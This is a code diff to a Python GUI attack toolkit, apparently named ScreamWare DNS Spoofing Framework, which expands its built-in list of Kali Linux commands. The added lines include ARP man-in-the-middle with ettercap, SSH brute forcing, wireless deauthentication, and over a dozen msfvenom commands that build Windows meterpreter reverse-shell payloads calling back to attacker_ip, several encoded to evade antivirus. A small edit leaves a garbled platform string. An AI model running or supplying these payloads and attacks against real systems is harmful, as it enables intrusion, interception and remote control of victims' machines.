@@ -19,7 +19,6 @@ import subprocess
 import threading
 import atexit
 import random
-import platform
 import traceback
 from datetime import datetime
 from pathlib import Path
@@ -1436,39 +1435,83 @@ def execute_command(command, output_callback=None):
         return error_msg, -1
 
 def get_kali_commands():
-    """Get list of common Kali Linux commands"""
+    """Return flat list of all Kali Linux commands"""
     return [
+        # 🔍 Reconnaissance & Scanning
         "nmap -sS -O target_ip",
-        "nikto -h http://target_ip",
+        "theHarvester -d target_domain -b google",
+        "dnsenum target_domain",
+        "recon-ng",
+        "netdiscover",
+        "xprobe2 -v -p target_ip",
+
+        # 📂 Directory & File Discovery
         "dirb http://target_ip",
         "gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+        "ffuf -u http://target_ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+
+        # 🔐 Brute Force & Login Attacks
         "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip",
+        "medusa -h target_ip -u admin -P /usr/share/wordlists/rockyou.txt -M ssh",
+
+        # 🧬 Web App Testing
         "sqlmap -u http://target_ip/page?id=1 --dbs",
+        "wpscan --url http://target_ip",
+        "nikto -h http://target_ip",
         "burpsuite",
+
+        # 📡 Network Sniffing & MITM
         "wireshark",
         "tcpdump -i interface",
+        "ettercap -T -q -i interface -M arp:remote /target_ip/ /gateway_ip/",
+
+        # 📶 Wireless Attacks
         "airmon-ng start wlan0",
         "airodump-ng wlan0mon",
         "aireplay-ng -0 10 -a target_bssid wlan0mon",
+
+        # 🔓 Password Cracking
         "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
         "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+
+        # 💣 Exploitation Frameworks
         "metasploit",
         "msfconsole",
         "searchsploit term",
+        "beef-xss",
+        "setoolkit",
+
+        # 🧭 SMB & Windows Enumeration
         "enum4linux target_ip",
         "smbclient -L target_ip",
+        "smbmap -H target_ip",
+
+        # 📡 Remote Access & Transfer
         "ftp target_ip",
         "ssh user@target_ip",
         "curl -I http://target_ip",
         "wget http://target_ip/file",
-        "whatweb target_ip",
-        "wpscan --url http://target_ip",
-        "skipfish -o output_dir http://target_ip",
-        "arachni http://target_ip",
-        "xsser -u http://target_ip",
-        "beef-xss",
-        "setoolkit",
-        "socialfish"
+
+        # 🧪 Misc Tools
+        "macchanger -r wlan0",
+        "tor",
+        "proxychains nmap -sT target_ip",
+
+        # 🪟 Windows Payloads (msfvenom)
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe",
+        "msfvenom -p windows/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe > shell_https.exe",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f ps1 > shell.ps1",
+        "msfvenom -p windows/shell/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell_basic.exe",
+        "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=attacker_ip LPORT=4444 -f exe > staged.exe",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll > payload.dll",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f hta-psh > payload.hta",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f vbs > payload.vbs",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f bat > payload.bat",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f c > payload.c",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f python > payload.py",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f asp > payload.asp",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -i icon.ico > payload.exe",
+        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > obfuscated.exe"
     ]
 
 def add_to_favorites(command):
@@ -2341,8 +2384,11 @@ def execute_dns_lookup():
 
     threading.Thread(target=dns_thread, daemon=True).start()
 
-def execute_mac_change():
-    """Execute MAC address change"""
+import threading
+from tkinter import messagebox
+
+def execute_mac_change(dry_run=False):
+    """Execute MAC address change with optional dry run"""
     interface = mac_interface_var.get()
     new_mac = mac_entry.get().strip()
 
@@ -2353,7 +2399,7 @@ def execute_mac_change():
     mac_status_label.config(text="Changing...", fg="#fbbf24")
 
     def mac_thread():
-        success = change_mac_address(interface, new_mac)
+        success = change_mac_address(interface, new_mac, dry_run=dry_run)
         if success:
             root.after(0, lambda: mac_status_label.config(text="Changed successfully", fg="#4ade80"))
         else:
@@ -3541,7 +3587,7 @@ features_data = [
     ("🔧", "Security Tools", "Complete toolkit: Port scanner, WHOIS, DNS lookup, MAC address changer", "#ff8b94"),
     ("🥩", "BeEF Integration", "Browser Exploitation Framework integration for security testing", "#98fb98"),
     ("🎭", "Modern UI", "Professional dark theme with smooth animations and intuitive design", "#6c5ce7"),
-    ("🖥️", "Cross-Platform", "Full compatibility across Windows, Linux, and macOS systems", "#a29bfe")
+    ("🖥️", "Cross-Platform", "Full compatibility across ,Linux, and macOS systems", "#a29bfe")
 ]
 
 # Create feature cards
@@ -3637,7 +3683,7 @@ info_label = tk.Label(contact_section,
 info_label.pack()
 
 copyright_label = tk.Label(contact_section,
-                          text="© 2024 ScreamsTerror - All Rights Reserved",
+                          text="© 2025 ScreamsTerror - All Rights Reserved",
                           fg="#6b7280", bg="#1e1e1e",
                           font=("Arial", 9))
 copyright_label.pack(pady=(5, 0))
@@ -3659,7 +3705,7 @@ load_config()
 log_output("🚀 ScreamWare DNS Spoofing Framework Initialized", "success")
 log_output("⚠️ Warning: This tool is for authorized security testing only", "warning")
 log_output("💡 Double-click hosts in Network Discovery to auto-fill targets", "info")
-log_output(f"🧪 HTML Lab folder: {str(HTML_LAB_DIR)} (served by Apache at /screamware_lab/ if started)", "info")
+log_output(f"🧪 HTML Lab folder: {str(HTML_LAB_DIR)} (served by Apache at var/www/html/ if started)", "info")
 
 # Check dependencies on startup (non-blocking)
 threading.Thread(target=check_dependencies, daemon=True).start()
